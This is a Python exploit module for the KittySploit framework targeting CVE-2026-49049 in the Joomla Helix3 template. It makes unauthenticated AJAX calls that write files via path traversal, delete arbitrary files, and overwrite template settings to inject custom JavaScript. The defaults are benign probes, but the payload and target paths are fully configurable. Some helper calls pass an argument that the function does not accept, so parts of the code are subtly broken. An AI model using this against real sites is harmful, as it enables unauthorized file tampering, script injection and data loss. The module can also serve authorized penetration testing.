#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from __future__ import annotations

import json
import random
import re
import string

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.joomla_probe import HELIX3_AJAX_PATH, HELIX3_PATCHED_VERSION, Joomla


class Module(Auxiliary, Http_client, Joomla):

    __info__ = {
        "name": "Joomla Helix3 <= 3.1.1 - Unauthenticated Arbitrary File Write (CVE-2026-49049)",
        "description": (
            "CVE-2026-49049 in JoomShaper Helix3 <= 3.1.1: unauthenticated file write via "
            "com_ajax helix3 save (path traversal in layoutName), arbitrary file delete via "
            "remove, and template parameter overwrite via import (Helix3 v3.x). The save "
            "action always appends .json — no reliable shell; use for authorized file "
            "write/delete/import verification only."
        ),
        "author": ["Phil Taylor", "KittySploit Team"],
        "cve": ["CVE-2026-49049"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-49049",
            "https://mysites.guru/blog/helix3-security-update-changelog-failure/",
        ],
        "platform": Platform.PHP,
        "tags": [
            "joomla",
            "helix3",
            "joomshaper",
            "file-write",
            "file-delete",
            "path-traversal",
            "auxiliary",
            "cve-2026-49049",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 6,
            "reversible": False,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals"],
            "cost": 1.5,
            "noise": 0.5,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["joomla", "php"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {"joomla": 0.3, "php": 0.3},
                "endpoint_pattern_any": [],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "file_write", "from_detail": "helix3_save"},
                    {"capability": "file_delete", "from_detail": "helix3_remove"},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [],
            },
        },
    }

    _SERVER_PATH_PATTERNS = (
        (re.compile(r"^/home\d*/[^/]+/public_html(/.*)"), 1),
        (re.compile(r"^/var/www/vhosts/[^/]+/(?:httpdocs|htdocs|web)(/.*)"), 1),
    )
    _WEBROOT_PREFIXES = ("/var/www/html", "/var/www", "/srv/www", "/htdocs", "/www")
    _COMMON_WRITE_PATHS = (
        "/var/www/html/images/{name}",
        "/var/www/html/tmp/{name}",
        "/var/www/html/cache/{name}",
        "/var/www/{name}",
        "/tmp/{name}",
    )

    action = OptChoice(
        "save",
        "Helix3 AJAX action to invoke",
        True,
        ["save", "remove", "import"],
    )
    layout_name = OptString(
        "",
        "layoutName for save/remove (supports ../ path traversal; .json appended on save)",
        required=False,
    )
    content = OptString(
        "",
        "File content for save (default: harmless JSON probe)",
        required=False,
    )
    template_id = OptString("1", "Template style ID for import action (Helix3 v3.x)", required=False)
    settings = OptString(
        "",
        "JSON settings payload for import (default: custom_js injection probe)",
        required=False,
    )
    verify_path = OptString(
        "",
        "Web path to verify written file (e.g. /images/ks123.json). Auto-derived when empty.",
        required=False,
    )
    cleanup = OptBool(
        True,
        "Remove the written probe file via remove after verification (save only)",
        required=False,
    )
    skip_version_check = OptBool(
        False,
        "Attempt even when Helix3 version appears patched",
        required=False,
        advanced=True,
    )

    def _random_stem(self) -> str:
        suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
        return f"ks{suffix}"

    def _default_probe_content(self) -> str:
        marker = self._random_stem("probe")
        return json.dumps({"probe": marker, "source": "kittysploit", "cve": "CVE-2026-49049"})

    def _default_import_settings(self) -> str:
        marker = self._random_stem("probe")
        return json.dumps(
            {
                "custom_js": f"/* KS-49049 probe {marker} — authorized assessment */",
            }
        )

    def _candidate_layout_names(self) -> list[str]:
        explicit = str(self.layout_name or "").strip()
        if explicit:
            return [explicit]
        stem = self._random_stem()
        return [pattern.format(name=stem) for pattern in self._COMMON_WRITE_PATHS]

    @classmethod
    def _server_path_to_url(cls, server_path: str) -> str:
        json_path = server_path if server_path.endswith(".json") else f"{server_path}.json"
        for pattern, group in cls._SERVER_PATH_PATTERNS:
            match = pattern.match(json_path)
            if match:
                return match.group(group)
        for prefix in cls._WEBROOT_PREFIXES:
            if json_path.startswith(prefix):
                return json_path[len(prefix):] or "/"
        return json_path

    def check(self):
        joomla = self.probe_joomla()
        if not joomla.get("found"):
            return {"vulnerable": False, "reason": "Joomla not detected", "confidence": "low"}

        helix3 = self.probe_helix3()
        if not helix3.get("found"):
            return {"vulnerable": False, "reason": "Helix3 not detected", "confidence": "low"}

        helix3_version = helix3.get("version")
        if not self.skip_version_check and helix3_version and self.helix3_is_patched(helix3_version):
            return {
                "vulnerable": False,
                "reason": f"Helix3 {helix3_version} >= {HELIX3_PATCHED_VERSION} (patched)",
                "confidence": "high",
            }

        confidence = "high" if helix3_version else "medium"
        reason = (
            f"Joomla + Helix3 detected (Helix3 {helix3_version or 'unknown'}). "
            f"Likely vulnerable to CVE-2026-49049 if < {HELIX3_PATCHED_VERSION}."
        )
        return {"vulnerable": True, "reason": reason, "confidence": confidence}

    def _run_save(self) -> bool:
        write_content = str(self.content or "").strip() or self._default_probe_content()
        verify_path = str(self.verify_path or "").strip()

        for layout in self._candidate_layout_names():
            print_status(f"Trying layoutName: {layout}")
            response = self.helix3_ajax_post(
                action="save",
                layout_name=layout,
                content=write_content,
                timeout=15,
            )
            if not self.helix3_ajax_success(response):
                print_warning(
                    f"save failed for {layout} "
                    f"(HTTP {response.status_code if response else 'n/a'})"
                )
                continue

            print_success(f"File write accepted for layoutName={layout}")
            url_path = verify_path or self._server_path_to_url(layout)
            if not url_path.startswith("/"):
                url_path = "/" + url_path

            print_status(f"Checking written file at {url_path}")
            check = self.http_request(method="GET", path=url_path, timeout=15)
            print_status(f"Fetch HTTP {check.status_code if check else 'n/a'}")

            if check and check.status_code == 200:
                body = (check.text or "").strip()
                print_success(f"Arbitrary file write confirmed at {url_path}")
                if body:
                    print_info(f"Content preview: {body[:200]}")
                if self.cleanup:
                    self.helix3_ajax_post(
                        action="remove",
                        layout_name=f"{layout}.json",
                        timeout=12,
                    )
                    print_status("Probe file removed via remove action")
                return True

            print_warning(f"File not reachable at {url_path} — write may still have succeeded")

        print_error("File write failed — no candidate path succeeded")
        return False

    def _run_remove(self) -> bool:
        layout = str(self.layout_name or "").strip()
        if not layout:
            print_error("layout_name is required for remove action")
            return False

        response = self.helix3_ajax_post(action="remove", layout_name=layout, timeout=15)
        if response and response.status_code == 200:
            print_success(f"remove request accepted for layoutName={layout}")
            return True

        print_error(f"remove failed (HTTP {response.status_code if response else 'n/a'})")
        return False

    def _run_import(self) -> bool:
        template_id = str(self.template_id or "1").strip() or "1"
        settings = str(self.settings or "").strip() or self._default_import_settings()

        response = self.helix3_ajax_post(
            action="import",
            template_id=template_id,
            settings=settings,
            timeout=15,
        )
        if not self.helix3_ajax_success(response):
            print_error(
                f"import failed (HTTP {response.status_code if response else 'n/a'}). "
                "This action requires Helix3 v3.x."
            )
            return False

        print_success(f"Template style {template_id} parameters overwritten via import")
        print_warning(
            "Verify site front-end for injected custom_js/custom_css — "
            "manual rollback may be required in Template Styles"
        )
        return True

    def run(self):
        try:
            action = str(self.action or "save").strip().lower() or "save"
            print_status("CVE-2026-49049 — Joomla Helix3 unauthenticated file write")
            print_status(f"Target: {self.target}:{self.port}")
            print_status(f"Endpoint: {HELIX3_AJAX_PATH}")
            print_status(f"Action: {action}")

            check = self.check()
            if not check.get("vulnerable"):
                print_error(check.get("reason", "Target does not appear vulnerable"))
                return False

            print_success(check.get("reason", "Target appears vulnerable"))

            if action == "remove":
                return self._run_remove()
            if action == "import":
                return self._run_import()
            return self._run_save()

        except Exception as exc:
            print_error(f"Operation failed: {exc}")
            return False
